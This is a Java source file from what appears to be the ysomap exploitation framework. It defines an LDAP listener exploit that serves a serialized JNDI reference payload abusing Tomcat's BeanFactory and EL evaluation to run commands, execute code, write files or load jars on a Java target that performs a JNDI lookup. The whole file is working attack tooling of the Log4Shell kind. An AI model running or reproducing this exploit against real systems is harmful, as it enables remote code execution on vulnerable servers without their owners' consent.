package ysomap.exploits.ldap;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import ysomap.bullets.Bullet;
import ysomap.bullets.jdk.rmi.TomcatRefBullet;
import ysomap.common.annotation.*;
import ysomap.common.util.Logger;
import ysomap.common.util.Status;
import ysomap.common.util.Strings;
import ysomap.core.serializer.Serializer;
import ysomap.core.serializer.SerializerFactory;
import ysomap.core.util.DetailHelper;
import ysomap.exploits.AbstractExploit;
import ysomap.exploits.ldap.component.LocalChainOperationInterceptor;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;

/**
 * @author wh1t3p1g
 * @since 2021/12/13
 */
@Exploits
@Authors({Authors.KINGX})
@Require(bullets = {"*"}, param = false)
@Dependencies({"tomcat el"})
@Details("Jndi reference 依赖tomcat BeanFactory，实现EL表达式执行")
public class LDAPTomcatRefListener extends AbstractExploit {
    @NotNull
    @Require(name = "lport", type = "int", detail = "LDAP Server listening port")
    public String lport = "1389";

    @NotNull
    @Require(name = "body", detail = "根据type类型，传入命令或代码")
    private String body;

    @Require(name = "classname", detail = "当type为代码时，需要填上最终载入的classname")
    private String classname;

    @Require(name = "filepath", detail = "当type为fw时，需要填上最终写入的文件位置")
    private String filepath;

    @NotNull
    @Require(name = "type", detail = "支持cmd、code、fw、loadJar")
    private String type;

    private InMemoryDirectoryServer ds;

    @Override
    public void work() {
        needRunning = true;
        InMemoryDirectoryServerConfig config = null;
        try {
            config = new InMemoryDirectoryServerConfig("dc="+ Strings.randomString(6) +",dc=com");
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen", //$NON-NLS-1$
                    InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                    Integer.parseInt(lport),
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));
            Serializer serializer = SerializerFactory.createSerializer("default");
            Bullet bullet = TomcatRefBullet.newInstance(type, body,classname,filepath);
            config.addInMemoryOperationInterceptor(
                    new LocalChainOperationInterceptor((byte[]) serializer.serialize(bullet.getObject())));
            ds = new InMemoryDirectoryServer(config);
            Logger.success("LDAPRefListener listening on 0.0.0.0:" + lport); //$NON-NLS-1$
            ds.startListening();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void stop() {
        ds.closeAllConnections(false);
        ds.close();
        status = Status.STOPPED;
        Logger.success("LDAPRef Listener stopped");
    }

    @Override
    public String toString() {
        return "LDAPTomcatRefListener{" +
                "lport='" + lport + '\'' +
                ", command='" + body + '\'' +
                '}';
    }
}
